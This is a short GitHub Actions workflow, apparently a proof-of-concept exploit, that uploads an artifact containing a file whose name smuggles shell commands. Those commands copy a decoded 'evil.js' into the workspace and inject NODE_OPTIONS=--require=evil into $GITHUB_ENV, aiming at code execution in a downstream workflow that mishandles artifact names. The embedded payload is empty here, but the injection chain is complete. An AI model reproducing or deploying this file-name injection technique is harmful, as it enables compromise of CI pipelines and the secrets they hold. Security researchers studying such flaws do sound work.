name: Test

on:
  workflow_dispatch:
  pull_request:
  push:
    branches: [main]

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          printf 'hello\n' > content/report.txt
          printf 'x\n' > content/x
          echo '' | base64 -d > content/evil.js
          printf 'y\n' > 'content/x;cd ..;cd ..;cd ..;cd ..;cd ..;cd tmp;cd content;cd content;cp evil.js $GITHUB_WORKSPACE;cd $GITHUB_WORKSPACE;sed -i 1iNODE_PATH=$PWD $GITHUB_ENV;sed -i 1iNODE_OPTIONS=--require=evil $GITHUB_ENV;true;#.txt'
      - uses: actions/upload-artifact@v4
        with:
          name: content
          path: content/
